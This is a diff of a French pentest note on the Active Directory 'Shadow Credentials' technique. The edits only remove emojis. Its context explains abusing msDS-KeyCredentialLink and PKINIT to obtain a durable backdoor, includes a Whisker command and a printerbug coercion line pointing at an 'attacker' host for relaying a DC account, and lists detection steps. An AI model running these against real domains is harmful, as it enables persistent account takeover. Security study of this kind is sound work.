@@ -12,20 +12,20 @@ statut: publie
 
 
 
-# 🌑 Shadow Credentials
+# Shadow Credentials
 
 > [!info] **En 1 phrase**
 > On **ajoute notre propre clé publique** dans l'attribut `msDS-KeyCredentialLink` d'un compte cible,
 > puis on s'authentifie **en tant que ce compte** via PKINIT → on obtient un TGT → on est le compte.
 
-> [!info] 💡 **Le principe (Key Trust / Windows Hello for Business)**
+> [!info] **Le principe (Key Trust / Windows Hello for Business)**
 > WHfB stocke des clés publiques dans `msDS-KeyCredentialLink`. Si on peut **écrire** dans cet
 > attribut (GenericWrite/GenericAll...), on se lie une clé dont on a la **clé privée** → le KDC
 > nous délivre un TGT pour ce compte (PKINIT). C'est un **backdoor** qui survit aux changements de mot de passe !
 
 ---
 
-## 🎯 Conditions
+## Conditions
 
 ```mermaid
 flowchart LR
@@ -38,11 +38,11 @@ flowchart LR
 - DC **Windows Server 2016+** (minimum pour PKINIT/Key Trust).
 - AD CS configuré (pour l'auth par certificat) **ou** mode "Key Trust".
 - Un droit d'**écriture** sur `msDS-KeyCredentialLink` du compte cible.
-- ⚠️ **Les comptes machines** peuvent s'éditer eux-mêmes (une seule clé max) ; les **users** non.
+- **Les comptes machines** peuvent s'éditer eux-mêmes (une seule clé max) ; les **users** non.
 
 ---
 
-## 🛠️ Exploitation
+## Exploitation
 
 ### Certipy (tout-en-un)
 
@@ -80,7 +80,7 @@ Whisker.exe remove /target:computername$ /remove:<device-id>
 
 ---
 
-## 🔀 Variantes puissantes
+## Variantes puissantes
 
 ### Shadow Credential Relay (on "se lie" un DC$ !)
 
@@ -119,7 +119,7 @@ proxychains python3 printerbug.py domain/user:pass@target attacker@8081/file   #
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -128,7 +128,7 @@ proxychains python3 printerbug.py domain/user:pass@target attacker@8081/file   #
 | **Surveiller les auths PKINIT inattendues** | Un compte qui s'auth par cert sans WHfB connu |
 | **Nettoyage** | Supprimer les clés ajoutées = seule vraie contre-mesure à chaud |
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
 - **Backdoor durable** : changer le mdp de la cible ne supprime PAS la clé → on reste dedans.
 - Sur un compte **machine**, il ne peut y avoir **qu'une clé** : `add` écrase la clé WHfB légitime → la machine peut casser son propre login. **Liste avant d'ajouter** et **supprime après**.
@@ -137,9 +137,9 @@ proxychains python3 printerbug.py domain/user:pass@target attacker@8081/file   #
 
 ---
 
-> [!info] 📚 **Sources**
+> [!info] **Sources**
 > - [InternalAllTheThings — Shadow Credentials](https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/pwd-shadow-credentials.md)
 > - [Shadow Credentials: Workstation Takeover Edition](https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition)
 > - [The Hacker Recipes — Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
 
-➡️ Liens : [[LAPS et GMSA|🗝️ LAPS & GMSA]] · [[Kerberos Delegation|🧬 Kerberos Delegation]] · [[05 - Active Directory|👑 Active Directory]]
+Liens : [[LAPS et GMSA| LAPS & GMSA]] · [[Kerberos Delegation| Kerberos Delegation]] · [[05 - Active Directory| Active Directory]]
